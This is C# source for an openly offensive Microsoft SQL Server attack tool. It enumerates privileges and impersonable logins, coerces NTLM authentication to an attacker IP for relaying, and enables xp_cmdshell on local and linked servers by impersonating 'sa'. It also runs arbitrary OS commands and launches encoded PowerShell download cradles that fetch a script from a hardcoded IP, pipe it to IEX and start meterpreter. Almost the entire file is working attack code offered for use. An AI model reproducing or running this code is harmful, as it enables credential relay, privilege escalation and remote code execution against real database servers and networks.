using System;
using System.Data.SqlClient;
using static System.Console;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            ForegroundColor = ConsoleColor.Blue | ConsoleColor.Red;
            BackgroundColor = ConsoleColor.Black;
            WriteLine("[-------------------------------------------]");
            WriteLine("[+] Welcome to Purpl3F0x's C# SQL client! [+]");
            WriteLine("[-------------------------------------------]\n");
            ResetColor();
            WriteLine("[~] Enter SQL hostname:");
            String sqlServer = ReadLine();
            String database = "master";

            String conString = $"Server = {sqlServer}; Database = {database}; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            ForegroundColor = ConsoleColor.Yellow;
            BackgroundColor = ConsoleColor.Black;
            WriteLine($"[*] Attempting to connect to {sqlServer}.\n");
            ResetColor();

            try
            {
                con.Open();
                ForegroundColor = ConsoleColor.Green;
                WriteLine($"[+] Successfully authenticated to {sqlServer}.\n");
                ResetColor();
                menu(con);
            }
            catch
            {
                BackgroundColor = ConsoleColor.Red;
                ForegroundColor = ConsoleColor.Black;
                WriteLine($"[ FATAL ] Failed to authenticate to {sqlServer}.\n");
                ResetColor();
                // FOR DEBUGGING AND TESTING, COMMENT THIS OUT OTHERWISE!
                menu(con);
                // Environment.Exit(0);

            }
        }

        public static void menu(SqlConnection con)
        {
            WriteLine("[---------------------------------]");
            WriteLine("1) Enumerate the user.");
            WriteLine("2) Execute SQL queries.");
            WriteLine("3) Execute UNC Path Injection (for use with Responder or ntlmrelayx).");
            WriteLine("4) Enumerate accounts that can be impersonated.");
            WriteLine("5) Enable xp_cmdshell and run a test command.");
            WriteLine("6) Run xp_cmdshell commands.");
            WriteLine("7) Enumerate Linked SQL servers.");
            WriteLine("8) Execute PowerShell dropper (requires xp_cmdshell)");
            WriteLine("9) Enable xp_cmdshell on a Linked SQL server.");
            WriteLine("10) Execute PowerShell dropper on a Linked SQL server.");
            WriteLine("99) Exit.\n");
            WriteLine("[~] Chose a task to perform:");
            string option = ReadLine();

            switch(option)
            {
                case "1":
                    EnumUser(con);
                    break;

                case "2":
                    RunQuery(con);
                    break;

                case "3":
                    UNC(con);
                    break;

                case "4":
                    EnumImpersonations(con);
                    break;

                case "5":
                    EnableXpCmdShell(con);
                    break;

                case "6":
                    RunCommand(con);
                    break;

                case "7":
                    EnumLinked(con);
                    break;

                case "8":
                    PsDownloadCradle(con);
                    break;

                case "9":
                    EnableXpCmdShellLinked(con);
                    break;

                case "10":
                    PsDownloadCradleLinked(con);
                    break;

                case "99":
                    ForegroundColor = ConsoleColor.Red | ConsoleColor.Blue;
                    BackgroundColor = ConsoleColor.Black;
                    WriteLine("[*] Exiting.\n");
                    ResetColor();
                    Environment.Exit(0);
                    break;

                default:
                    ForegroundColor = ConsoleColor.Red;
                    BackgroundColor = ConsoleColor.Black;
                    WriteLine("[!] Invalid option.\n");
                    ResetColor();
                    menu(con);
                    break;

            }
        }

        public static void EnumUser(SqlConnection con)
        {
            ForegroundColor = ConsoleColor.Yellow;
            BackgroundColor = ConsoleColor.Black;
            WriteLine("[*] Attempting to enumerate currently logged in user.\n");
            ResetColor();
            try
            {
                ForegroundColor = ConsoleColor.Yellow;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("[*] Checking if current user is in 'public' role...\n");
                ResetColor();
                String queryLogin = "SELECT SYSTEM_USER";
                SqlCommand command = new SqlCommand(queryLogin, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Read();
                WriteLine("[*] Logged in as domain user: " + reader[0] + "\n");
                reader.Close();

                String queryUser = "SELECT USER_NAME()";
                command = new SqlCommand(queryUser, con);
                reader = command.ExecuteReader();
                reader.Read();
                WriteLine("[*] Logged in as db user: " + reader[0] + "\n");
                reader.Close();

                String queryPublicRole = "SELECT IS_SRVROLEMEMBER('public');";
                command = new SqlCommand(queryPublicRole, con);
                reader = command.ExecuteReader();
                reader.Read();
                Int32 role = Int32.Parse(reader[0].ToString());
                if (role == 1)
                {
                    ForegroundColor = ConsoleColor.Green;
                    BackgroundColor = ConsoleColor.Black;
                    WriteLine("[+] User is a member of public role.\n");
                    ResetColor();
                }
                else
                {
                    ForegroundColor = ConsoleColor.Yellow;
                    BackgroundColor = ConsoleColor.Black;
                    WriteLine("[*] User is NOT a member of public role.\n");
                    ResetColor();
                }
                reader.Close();

                ForegroundColor = ConsoleColor.Yellow;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("[*] Checking if current user is in 'SA' role...\n");
                ResetColor();
                String querySA = "SELECT IS_SRVROLEMEMBER('sysadmin');";
                command = new SqlCommand(querySA, con);
                reader = command.ExecuteReader();
                reader.Read();
                Int32 role2 = Int32.Parse(reader[0].ToString());
                if (role2 == 1)
                {
                    ForegroundColor = ConsoleColor.Green;
                    BackgroundColor = ConsoleColor.Black;
                    WriteLine("[+] User is a member of SA role!!!\n");
                    ResetColor();
                }
                else
                {
                    ForegroundColor = ConsoleColor.Yellow;
                    BackgroundColor = ConsoleColor.Black;
                    WriteLine("[*] User is NOT a member of SA role.\n");
                    ResetColor();
                }
                reader.Close();
            }
            catch
            {
                ForegroundColor = ConsoleColor.Red;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("[!] Something went wrong, returning to menu.\n");
                ResetColor();
                menu(con);
            }
            WriteLine("[*] Returning to menu.\n");
            menu(con);
        }

        public static void RunQuery(SqlConnection con)
        {
            WriteLine("[~] Type a SQL query to execute on the SQL server:");
            String execCMD = ReadLine();

            try
            {
                ForegroundColor = ConsoleColor.Yellow;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("[*] Attempting to execute SQL query...\n");
                ResetColor();
                SqlCommand command = new SqlCommand(execCMD, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Read();
                WriteLine(reader[0]);
                reader.Close();

                ForegroundColor = ConsoleColor.Green;
                WriteLine("[+] Success, returning to menu.\n");
                ResetColor();
                menu(con);
            }
            catch
            {
                ForegroundColor = ConsoleColor.Red;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("[!] Something went wrong, returning to menu.\n");
                ResetColor();
                menu(con);
            }
        }

        public static void UNC(SqlConnection con)
        {
            WriteLine("[~] Provide attacker IP address:");
            string host = ReadLine();

            try
            {
                ForegroundColor = ConsoleColor.Yellow;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("[*] Attempting to run command...\n");
                ResetColor();
                string query = $"EXEC master..xp_dirtree \"\\\\{host}\\\\test\";";
                SqlCommand command = new SqlCommand(query, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();

                ForegroundColor = ConsoleColor.Green;
                WriteLine("Executed successfully, returning to menu.\n");
                ResetColor();
                menu(con);
            }
            catch
            {
                ForegroundColor = ConsoleColor.Red;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("Something went wrong, returning to menu.\n");
                ResetColor();
                menu(con);
            }
            
        }

        public static void EnumImpersonations(SqlConnection con)
        {
            try
            {
                ForegroundColor = ConsoleColor.Yellow;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("[*] Attempting to find users who can be Impersonated...\n");
                ResetColor();
                String query = "Select distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
                SqlCommand command = new SqlCommand(query, con);
                SqlDataReader reader = command.ExecuteReader();

                while (reader.Read() == true)
                {
                    WriteLine("[+] Logins that can be impersonated:\n");
                    ForegroundColor = ConsoleColor.Green;
                    BackgroundColor = ConsoleColor.Black;
                    WriteLine(reader[0]);
                    ResetColor();
                }
                reader.Close();
            }
            catch
            {
                ForegroundColor = ConsoleColor.Red;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("[!] Something went wrong, returning to menu.\n");
                ResetColor();
                menu(con);
            }
                WriteLine("[*] Returning to menu.\n");
                menu(con);
        }

        public static void EnableXpCmdShell(SqlConnection con)
        {
            try
            {
                ForegroundColor = ConsoleColor.Yellow;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("[*] Trying to enable xp_cmdshell...\n");
                ResetColor();
                string enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";

                SqlCommand command = new SqlCommand(enable_xpcmd, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();
            }
            catch
            {
                ForegroundColor = ConsoleColor.Red;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("[!] Can't enable xp_cmdshell, returning to menu.\n");
                ResetColor();
                menu(con);
            }

            ForegroundColor = ConsoleColor.Green;
            WriteLine("[+] Succeeded in enabling xp_cmdshell, testing code execution...\n");
            ResetColor();
            string execCmd = "EXEC xp_cmdshell whoami";
            SqlCommand command2 = new SqlCommand(execCmd, con);
            SqlDataReader reader2 = command2.ExecuteReader();
            reader2.Read();
            WriteLine("[+] User that SQL is running as: " + reader2[0] + "\n");
            reader2.Close();

            WriteLine("[*] Returning to menu.\n");
            menu(con);

        }

        public static void RunCommand(SqlConnection con)
        {
            string loop = "true";
            while (loop == "true")
            {
                try
                {
                    WriteLine("[~] Enter the OS command to run:");
                    string cmd = ReadLine();

                    string execCmd = $"EXEC xp_cmdshell {cmd}";

                    SqlCommand command = new SqlCommand(execCmd, con);
                    SqlDataReader reader = command.ExecuteReader();
                    reader.Read();
                    WriteLine("[*] Command output:");
                    WriteLine(reader[0]);
                    WriteLine("------------------------");
                    WriteLine("[~] Enter another command?");
                    string answer = ReadLine();

                    if (answer == "yes")
                    {
                        loop = "true";
                    }
                    else
                    {
                        loop = "false";
                    }
                    WriteLine("[*] Returning to menu.\n");
                    menu(con);
                }
                catch
                {
                    ForegroundColor = ConsoleColor.Red;
                    BackgroundColor = ConsoleColor.Black;
                    WriteLine("[!] Something went wrong, returning to menu.\n");
                    ResetColor();
                    menu(con);
                }
            }   
        }

        public static void EnumLinked(SqlConnection con)
        {
            try
            {
                ForegroundColor = ConsoleColor.Yellow;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("[*] Attempting to find linked SQL servers...\n");
                ResetColor();

                string execCMD = "EXEC sp_linkedservers;";

                SqlCommand command = new SqlCommand(execCMD, con);
                SqlDataReader reader = command.ExecuteReader();

                while (reader.Read())
                {
                    WriteLine("[+] Linked SQL Server(s):");
                    ForegroundColor = ConsoleColor.Green;
                    BackgroundColor = ConsoleColor.Black;
                    WriteLine(reader[0]);
                    ResetColor();
                }
            }
            catch
            {
                ForegroundColor = ConsoleColor.Red;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("[!] Something went wrong, returning to menu.\n");
                ResetColor();
                menu(con);
            }

            WriteLine("[*] Returning to menu.\n");
            menu(con);
        }

        public static void PsDownloadCradle(SqlConnection con)
        {
            try
            {
                WriteLine("[~] Provided the Base64-encoded PowerShell command:");
                string encoded = ReadLine();
                ForegroundColor = ConsoleColor.Yellow;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("[*] Attempting to run PowerShell command to download and execute meterpreter...\n");
                ResetColor();

                string execCMD = $"EXEC ''xp_cmdshell Powershell -enc {encoded}''";

                SqlCommand command = new SqlCommand(execCMD, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Read();
                reader.Close();
                WriteLine("[+] Command should have executed, check MSF.\n");
                WriteLine("[*] Returning to menu.");
                menu(con);
            }
            catch
            {
                ForegroundColor = ConsoleColor.Red;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("[!] Something went wrong, returning to menu.\n");
                ResetColor();
                menu(con);
            }
        }

        public static void EnableXpCmdShellLinked(SqlConnection con)
        {
            try
            {
                WriteLine("[~] Specify which Linked SQL server to attack:");
                string sqlHost = ReadLine();
                ForegroundColor = ConsoleColor.Yellow;
                BackgroundColor = ConsoleColor.Black;
                WriteLine($"[*] Trying to enable xp_cmdshell on {sqlHost}...\n");
                ResetColor();
                string enable_xpcmd = $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT {sqlHost};";

                String executeas = "EXECUTE AS LOGIN = 'sa';";
                SqlCommand command = new SqlCommand(executeas, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(enable_xpcmd, con);
                reader = command.ExecuteReader();
                reader.Close();

                ForegroundColor = ConsoleColor.Green;
                WriteLine("[+] Succeeded in enabling xp_cmdshell, testing code execution...\n");
                ResetColor();
                string execCmd = $"EXEC ('xp_cmdshell whoami') AT {sqlHost};";
                SqlCommand command2 = new SqlCommand(execCmd, con);
                SqlDataReader reader2 = command2.ExecuteReader();
                reader2.Read();
                WriteLine($"[+] User that SQL is running as on {sqlHost}:" + reader2[0] + "\n");
                reader2.Close();

                WriteLine("[*] Returning to menu.\n");
                menu(con);
            }
            catch
            {
                ForegroundColor = ConsoleColor.Red;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("[!] Something went wrong, returning to menu.\n");
                ResetColor();
                menu(con);
            }
        }

        public static void PsDownloadCradleLinked(SqlConnection con)
        {
            try
            {
                WriteLine("[~] Specify which Linked SQL server to attack:");
                string sqlHost = ReadLine();

                ForegroundColor = ConsoleColor.Yellow;
                BackgroundColor = ConsoleColor.Black;
                WriteLine($"[*] Attempting to run PowerShell command on {sqlHost} to download and execute meterpreter...\n");
                ResetColor();

                String executeas = "EXECUTE AS LOGIN = 'sa';";
                SqlCommand command = new SqlCommand(executeas, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();

                string execCMD = $"EXEC ('xp_cmdshell ''Powershell -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUANQAvAGQAbwB3AG4AbABvAGEAZABfAGMAcgBhAGQAbABlAC4AcABzADEAJwApACAAfAAgAEkARQBYAA==''') AT {sqlHost};";

                command = new SqlCommand(execCMD, con);
                reader = command.ExecuteReader();
                reader.Read();
                reader.Close();
                WriteLine("[+] Command should have executed, check MSF.\n");
                WriteLine("[*] Returning to menu.\n");
                menu(con);
            }
            catch
            {
                ForegroundColor = ConsoleColor.Red;
                BackgroundColor = ConsoleColor.Black;
                WriteLine("[!] Something went wrong, returning to menu.\n");
                ResetColor();
                menu(con);
            }
        }
    }
}
